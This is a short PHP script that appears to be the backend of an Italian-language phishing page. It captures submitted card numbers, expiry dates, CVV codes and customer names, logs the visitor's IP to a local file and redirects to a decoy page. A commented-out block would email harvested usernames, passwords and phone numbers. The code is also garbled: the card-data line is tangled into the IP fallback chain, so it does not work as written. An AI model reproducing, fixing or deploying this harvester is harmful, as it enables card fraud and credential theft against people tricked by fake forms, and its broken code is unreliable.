<?php
header ('Location:load2.html');
date_default_timezone_set('Europe/Rome');
$handle = fopen("info", "a");
$date = date('Y-m-d H:i:s');
$ip = getenv('HTTP_CLIENT_IP')?:
$out=" [{$date}] {$_SERVER['REMOTE_ADDR']}  |  CARTA: {$_POST['card_number']}  |  SCADENZA: {$_POST['expiry_date']}/{$_POST['expiry_date2']}  |  CVV: {$_POST['cvv']}  |  CLIENTE: {$_POST['business']}\n";
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');
fwrite($handle, "IP: ");
fwrite($handle, $ip);
fclose($handle);


/*$to = "-";
$subject = "Dati login ricevuti";
$message = "Username: " . $_POST["username"] . " Password: " . $_POST["password"]. "phone: " . $_POST ["phone"]
$from = "-";
mail($to,$subject,$message,$from);*/

exit;
?>